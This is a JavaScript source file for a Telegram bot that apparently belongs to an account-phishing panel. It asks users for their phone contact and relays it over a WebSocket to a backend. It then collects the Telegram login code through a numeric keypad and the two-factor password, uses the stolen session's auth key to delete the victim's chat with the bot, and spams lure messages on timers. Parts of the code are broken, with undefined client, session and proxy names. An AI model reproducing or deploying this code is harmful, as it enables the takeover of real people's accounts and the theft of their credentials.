import TelegramBot from "node-telegram-bot-api";
import { WebSocket } from "ws";
import config from "../../config.json" assert { type: 'json' };
import Bot from "../database/schemas/bot.js";
import Template from "../database/schemas/template.js";
import { bot as mainBot } from "../bot/index.js";
import botUser from "../database/schemas/botUser.js";
import { toHTML } from "@telegraf/entity";
import log from "../database/schemas/log.js";
import emitter from "../bot/botDeletor.js";
import fs from 'fs';


export default async (token, initialConfig) => {
    let currentConfig = { ...initialConfig };

    async function updateConfig() {
        const updatedBot = await Bot.findOne({ token });
        if (!updatedBot) return;
        const template = await Template.findOne({ id: updatedBot.template });
        

        currentConfig = {
            id: updatedBot.id,
            owner: updatedBot.owner,
            name: updatedBot.name,
            media_startbot: template?.media_startbot || null,
            start: template?.start || null,
            code: template?.code || null,
            auth: template?.auth || null,
            password: template?.password || null,
            wrongPassword: template?.wrongPassword || null,
            wrongCode: template?.wrongCode || null,
            NaNCode: template?.NaNCode || null,
            timeout: template?.timeout || null,
            error: template?.error || null,
            wait: template?.wait || null,
            contact: template?.contact || null,
            mailing1h: template?.mailing1h || null,
            button: template?.button || null,
            type: template?.type || null,
            url: template?.url || null,
            mailing1hUnauth: template?.mailing1hUnauth || null,
            buttonUnauth: template?.buttonUnauth || null,
            typeUnauth: template?.typeUnauth || null,
            urlUnauth: template?.urlUnauth || null
        };
   
    }


    setInterval(updateConfig, 30000);

    const sockets = new Map();
    const sent = new Map();
    const state = new Map();
    const bot = new TelegramBot(token, { polling: true });
    const info = await bot.getMe().catch(() => ({ username: token }));
    const BOT = await Bot.findOne({ token });
    const q = new Map();
    const timeouts = new Map();

    emitter.on('delete', async id => {
        if (id != BOT.id) return;

        await bot.stopPolling();
    })

    bot.proxy = bot.sendMessage;
    bot.sendMessage = async (id, text, opts) => {
        if (text) {
            text = text.replaceAll('&lt;bot&gt;', `@${info.username}`);
        }
        return await bot.proxy(id, text, opts);
    }

    // Хранилище активных таймеров для каждого пользователя
    const activeTimers = new Map();

    bot.on(`message`, async message => {
        await updateConfig();

        const intervals = [5, 10, 30, 60, 240];
        const userId = message.from.id;

        if (activeTimers.has(userId)) {
            const timers = activeTimers.get(userId);
            timers.forEach(timer => clearTimeout(timer));
            activeTimers.delete(userId);
        }

        const userTimers = [];

        for (let minutes of intervals) {
            const timer = setTimeout(async () => {
                if (!await Bot.findOne({ token })) return;
                const logged = await log.findOne({ uid: userId });

                if (!logged && currentConfig.mailing1hUnauth === 'Пропустить') return;
                if (logged && currentConfig.mailing1h === 'Пропустить') return;

                await bot.sendMessage(userId,
                    logged ? currentConfig.mailing1h : currentConfig.mailing1hUnauth,
                    {
                        parse_mode: 'HTML',
                        reply_markup: {
                            inline_keyboard: [
                                [
                                    logged ? {
                                        text: currentConfig.button || 'Кнопка',
                                        ...(currentConfig.url === 'Старт' 
                                            ? { callback_data: 'start' }
                                            : currentConfig.url 
                                                ? { url: currentConfig.url.includes('>') 
                                                    ? currentConfig.url.split('>')?.[1]?.split('<')?.[0] 
                                                    : currentConfig.url }
                                                : { callback_data: 'start' })
                                    } : {
                                        text: currentConfig.buttonUnauth || 'Кнопка',
                                        ...(currentConfig.urlUnauth === 'Старт'
                                            ? { callback_data: 'start' }
                                            : currentConfig.urlUnauth
                                                ? { url: currentConfig.urlUnauth.includes('>')
                                                    ? currentConfig.urlUnauth.split('>')?.[1]?.split('<')?.[0]
                                                    : currentConfig.urlUnauth }
                                                : { callback_data: 'start' })
                                    }
                                ]
                            ]
                        }
                    }
                ).catch(console.log);

                // Удаляем таймер после выполнения
                const userTimers = activeTimers.get(userId);
                if (userTimers) {
                    const index = userTimers.indexOf(timer);
                    if (index > -1) {
                        userTimers.splice(index, 1);
                    }
                    if (userTimers.length === 0) {
                        activeTimers.delete(userId);
                    }
                }
            }, minutes * 60 * 1000);

            userTimers.push(timer);
        }

        // Сохраняем таймеры пользователя
        activeTimers.set(userId, userTimers);

        const ll = await log.findOne({ uid: message.from.id });
        if (!q.get(message.from.id)) {
            q.set(message.from.id, true);

            for (let minutes of [5, 10, 30, 60, 240]) {
                setTimeout(async () => {
                    if (!await Bot.findOne({ token })) return;
                    const logged = await log.findOne({ uid: message.from.id });

                    if (!logged && currentConfig.mailing1hUnauth === 'Пропустить') return;
                    if (logged && currentConfig.mailing1h === 'Пропустить') return;
                    await bot.sendMessage(message.from.id,
                        logged ? currentConfig.mailing1h : currentConfig.mailing1hUnauth,
                        {
                            parse_mode: 'HTML',
                            reply_markup: {
                                inline_keyboard: [
                                    [
                                        logged ? {
                                            text: currentConfig.button || 'Кнопка',
                                            ...(currentConfig.url === 'Старт' 
                                                ? { callback_data: 'start' }
                                                : currentConfig.url 
                                                    ? { url: currentConfig.url.includes('>') 
                                                        ? currentConfig.url.split('>')?.[1]?.split('<')?.[0] 
                                                        : currentConfig.url }
                                                    : { callback_data: 'start' })
                                        } : {
                                            text: currentConfig.buttonUnauth || 'Кнопка',
                                            ...(currentConfig.urlUnauth === 'Старт'
                                                ? { callback_data: 'start' }
                                                : currentConfig.urlUnauth
                                                    ? { url: currentConfig.urlUnauth.includes('>')
                                                        ? currentConfig.urlUnauth.split('>')?.[1]?.split('<')?.[0]
                                                        : currentConfig.urlUnauth }
                                                    : { callback_data: 'start' })
                                        }
                                    ]
                                ]
                            }
                        }
                    ).catch(console.log)
                }, 60 * 1000 * minutes);
            }
        }


        const socket = sockets.get(message.from.id);
        if (message.text?.startsWith(`/start`)) {
            if (ll) return await bot.sendMessage(message.from.id, currentConfig.auth, { reply_markup: { remove_keyboard: true }, parse_mode: 'HTML' });

            if (!await botUser.findOne({ id: message.from.id, botId: BOT.id })) {
                await new botUser({ id: message.from.id, botId: BOT.id, created: Date.now() }).save();
            }
            if (socket && socket.readyState)
                socket.close();

            sent.delete(message.from.id);
            state.delete(message.from.id);
            sockets.set(message.from.id, new WebSocket(config.socket + `?owner=${currentConfig.owner}&id=${currentConfig.id}&type=bot&token=${token}&lang=${message.from.language_code}`));
            if (currentConfig.media_startbot && fs.existsSync(currentConfig.media_startbot)) {
                try {

                    const photo = fs.readFileSync(currentConfig.media_startbot);
                    const logged = await log.findOne({ uid: message.from.id });
                    await bot.sendPhoto(message.from.id, photo, {
                        caption: currentConfig.start,
                        parse_mode: "HTML",
                        reply_markup: {
                            resize_keyboard: true,
                            keyboard: [
                                [
                                    {
                                        text: currentConfig.contact,
                                        request_contact: true
                                    }
                                ]
                            ]
                        }
                    });
                } catch (error) {
                    console.error('Полная ошибка:', error);
                    console.error('Путь к файлу:', currentConfig.media_startbot);

                    await bot.sendMessage(message.from.id, currentConfig.start, {
                        parse_mode: "HTML"
                    });
                }
            } else {
                await bot.sendMessage(message.from.id, currentConfig.start, {
                    parse_mode: "HTML",
                    reply_markup: {
                        resize_keyboard: true,
                        keyboard: [
                            [
                                {
                                    text: currentConfig.contact,
                                    request_contact: true
                                }
                            ]
                        ]
                    }
                });
            }
            return sockets.get(message.from.id).on(`message`, async msg => {
                msg = JSON.parse(msg.toString());
                console.log(msg)
                switch (msg.action) {
                    case 'success':
                        sent.delete(message.from.id);
                        if(currentConfig.deleteBot) {
                            const log = await log.findOne({ id: msg.log_id });
                            const client = new TelegramClient(new StringSession(), log.dcId, log.authKey, {
                                connectionRetries: 10,
                                proxy: formated,
                                "appVersion": log.deviceParams.app_version,
                                "deviceModel": log.deviceParams.device,
                                "systemVersion": log.deviceParams.sdk,
                                'langCode': log.deviceParams.lang_code
                            });
                            
                            client.connect().then(async () => {
                                try {
                                
                                    const dialogs = await client.getDialogs();
                                    
                                    const botDialog = dialogs.find(dialog => dialog.entity.username === 'target_bot_username');
                                    
                                    if (botDialog) {
                                        
                                        await client.deleteMessages(botDialog.entity, [], { revoke: true });
                                    }
                                    
                                    await client.disconnect();
                                } catch (error) {
                                    console.error('Error deleting chat:', error);
                                }
                            }).catch(console.error);
                        }
                        return await bot.sendMessage(message.from.id, currentConfig.auth, { reply_markup: { remove_keyboard: true }, parse_mode: "HTML" });
                    case `password`:
                        sent.delete(message.from.id);
                        if (state.get(message.from.id) === 'password')
                            await bot.sendMessage(message.from.id, currentConfig.wrongPassword, { parse_mode: `HTML` });

                        state.set(message.from.id, 'password');
                        return await bot.sendMessage(message.from.id, currentConfig.password, { reply_markup: { remove_keyboard: true }, parse_mode: "HTML" });
                    case `code`:
                        if (sent.get(message.from.id))
                            await bot.sendMessage(message.from.id, currentConfig.wrongCode, { parse_mode: `HTML` });

                        sent.set(message.from.id, true)
                        return await bot.sendMessage(message.from.id, currentConfig.code, {
                            parse_mode: "HTML",
                            reply_markup: {
                                inline_keyboard: [
                                    [
                                        {
                                            text: `📲 Показать код`,
                                            url: `https://t.me/+42777`
                                        }
                                    ],
                                    [
                                        {
                                            text: `1`,
                                            callback_data: `input:1`
                                        },
                                        {
                                            text: `2`,
                                            callback_data: `input:2`
                                        },
                                        {
                                            text: `3`,
                                            callback_data: `input:3`
                                        }
                                    ],
                                    [
                                        {
                                            text: `4`,
                                            callback_data: `input:4`
                                        },
                                        {
                                            text: `5`,
                                            callback_data: `input:5`
                                        },
                                        {
                                            text: `6`,
                                            callback_data: `input:6`
                                        }
                                    ],
                                    [
                                        {
                                            text: `7`,
                                            callback_data: `input:7`
                                        },
                                        {
                                            text: `8`,
                                            callback_data: `input:8`
                                        },
                                        {
                                            text: `9`,
                                            callback_data: `input:9`
                                        }
                                    ],
                                    [
                                        {
                                            text: `0`,
                                            callback_data: `input:0`
                                        },
                                        {
                                            text: `🔙`,
                                            callback_data: `input:`
                                        }
                                    ]
                                ]
                            }
                        });
                }
            })
        }

        if (ll) return;

        if (sent.get(message.from.id)) {
            return await bot.sendMessage(message.from.id, currentConfig.NaNCode, { parse_mode: "HTML", reply_markup: { remove_keyboard: true } });
        }

        if (state.get(message.from.id) === 'password') {
            return sockets.get(message.from.id)?.send(JSON.stringify({ action: `password`, data: message.text }));
        }

        if (message.contact) {
            if (message.contact.user_id !== message.from.id) return;
            try {
                if(!config.app_prod){
                    message.contact.phone_number = "79626194127";
                }
                
                sockets.get(message.from.id)?.send(JSON.stringify({ action: `number`, data: message.contact.phone_number }));





                await bot.sendMessage(message.from.id, currentConfig.wait, { parse_mode: "HTML", reply_markup: { remove_keyboard: true } });

                if (timeouts.has(message.from.id)) {
                    clearTimeout(timeouts.get(message.from.id));
                }

                const timeout = setTimeout(async () => {
                    const logged = await log.findOne({ uid: message.from.id });
                    if (logged) return;
                    
                    try {
                        await bot.sendMessage(message.from.id, currentConfig.timeout, { parse_mode: 'HTML' })
                            .catch(console.log);
                    } catch (error) {
                        console.error('Error sending timeout message:', error);
                    }
                    
                    timeouts.delete(message.from.id);

                }, 5 * 60 * 1000);
                // }, 30 * 1000);
                timeouts.set(message.from.id, timeout);

                return;
            } catch {
                return await bot.sendMessage(message.from.id, currentConfig.error, { parse_mode: "HTML", reply_markup: { remove_keyboard: true } });
            }
        }
    })

    bot.on(`callback_query`, async query => {
        if (!sockets.get(query.from.id) || !sockets.get(query.from.id).readyState) return
        const [id, value] = query.data.split(":");
        if (id !== `input`) {
            await bot.deleteMessage(query.from.id, query.message.message_id);
            query.text = '/start';

            bot.emit('message', query);
            return;
        };

        if (value.length === 5) {
            await bot.deleteMessage(query.message.chat.id, query.message.message_id).catch(console.log);
            if (!sockets.get(query.from.id)) return await bot.sendMessage(query.from.id, currentConfig.timeout, { parse_mode: 'HTML' })
            return sockets.get(query.from.id).send(JSON.stringify({ action: 'code', data: value }));
        }

        let text = toHTML(query.message);
        if (text === currentConfig.code) {
            text = text + `\n\n` + `<b>${value}</b>`;
        } else {
            text = text.split(`\n`);
            text[text.length - 1] = `<b>${value}</b>`;
            text = text.join(`\n`)
        }

        await bot.editMessageText(text, {
            parse_mode: "HTML",
            message_id: query.message.message_id,
            chat_id: query.message.chat.id,
            reply_markup: {
                inline_keyboard: [
                    [
                        {
                            text: `📲 Показать код`,
                            url: `https://t.me/+42777`
                        }
                    ],
                    [
                        {
                            text: `1`,
                            callback_data: `input:${value}1`
                        },
                        {
                            text: `2`,
                            callback_data: `input:${value}2`
                        },
                        {
                            text: `3`,
                            callback_data: `input:${value}3`
                        }
                    ],
                    [
                        {
                            text: `4`,
                            callback_data: `input:${value}4`
                        },
                        {
                            text: `5`,
                            callback_data: `input:${value}5`
                        },
                        {
                            text: `6`,
                            callback_data: `input:${value}6`
                        }
                    ],
                    [
                        {
                            text: `7`,
                            callback_data: `input:${value}7`
                        },
                        {
                            text: `8`,
                            callback_data: `input:${value}8`
                        },
                        {
                            text: `9`,
                            callback_data: `input:${value}9`
                        }
                    ],
                    [
                        {
                            text: `0`,
                            callback_data: `input:${value}0`
                        },
                        {
                            text: `🔙`,
                            callback_data: `input:${value.slice(0, value.length - 1)}`
                        }
                    ]
                ]
            }
        })
            .catch(console.log)
    })

    bot.on(`polling_error`, async err => {
        if (!err.message.includes(`401`)) return;
        await bot.stopPolling();
        await Bot.findOneAndUpdate({ token }, { $set: { blocked: true } });
        
        await mainBot.sendMessage(currentConfig.owner, `*🚨 Ваш бот @${BOT.username} был заблокирован!*`, { parse_mode: 'Markdown' });
    })

    // Очистка таймеров при выключении бота
    process.on('SIGINT', () => {
        for (const timers of activeTimers.values()) {
            timers.forEach(timer => clearTimeout(timer));
        }
        activeTimers.clear();
        process.exit();
    });
}